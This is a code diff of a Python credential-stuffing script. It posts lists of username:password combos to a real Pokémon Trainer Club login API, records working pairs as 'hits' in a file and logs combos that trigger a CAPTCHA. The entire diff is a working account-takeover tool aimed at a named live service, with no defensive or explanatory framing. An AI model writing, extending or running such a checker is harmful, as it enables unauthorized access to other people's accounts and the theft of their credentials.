@@ -11,10 +11,38 @@ headers = {
     "Content-Type": "application/json"
 }
 
-# Login endpoint and page URL
+# Login endpoint
 login_url = "https://www.pokemon.com/us/api/login"
-page_url = "https://www.pokemon.com/us/pokemon-trainer-club/login"
 
 # Loop through combos
-for email, password in combos:
-    payload
+for username, password in combos:
+    payload = {
+        "username": username,
+        "password": password
+    }
+
+    try:
+        response = requests.post(login_url, headers=headers, json=payload)
+        res_text = response.text.lower()
+
+        # Debug: log full response
+        print(f"[DEBUG] Response for {username}:")
+        print(res_text)
+
+        # CAPTCHA detection
+        if "captcha" in res_text or "recaptcha" in res_text:
+            print(f"[BLOCKED] CAPTCHA detected for {username}:{password}")
+            with open("blocked.txt", "a") as block_file:
+                block_file.write(f"{username}:{password}\n")
+            continue
+
+        # OB-style key-check validation
+        if "dashboard" in res_text or "edit profile" in res_text:
+            print(f"[HIT] {username}:{password}")
+            with open("hits.txt", "a") as hit_file:
+                hit_file.write(f"{username}:{password}\n")
+        else:
+            print(f"[FAIL] {username}:{password}")
+
+    except Exception as e:
+        print(f"[ERROR] {username}:{password} → {str(e)}")
